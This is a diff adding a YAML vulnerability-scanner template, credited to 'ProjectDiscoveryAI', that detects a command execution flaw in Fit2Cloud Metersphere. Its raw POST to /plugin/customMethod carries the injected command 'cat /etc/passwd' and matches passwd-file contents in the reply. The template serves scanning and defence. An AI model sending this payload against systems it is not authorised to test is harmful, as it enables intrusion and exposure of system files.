@@ -1,0 +1,25 @@
+id: fit2cloud-metersphere-ct-416542
+info:
+  name: Fit2Cloud Metersphere Command Execution
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    Detects command execution vulnerability via the /plugin/customMethod endpoint
+    by attempting to read sensitive files like /etc/passwd.
+http:
+  - raw:
+      - |
+        POST /plugin/customMethod HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+
+        {"entry": "Evil", "request": "cat /etc/passwd"}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "root:[x*]:0:0:"
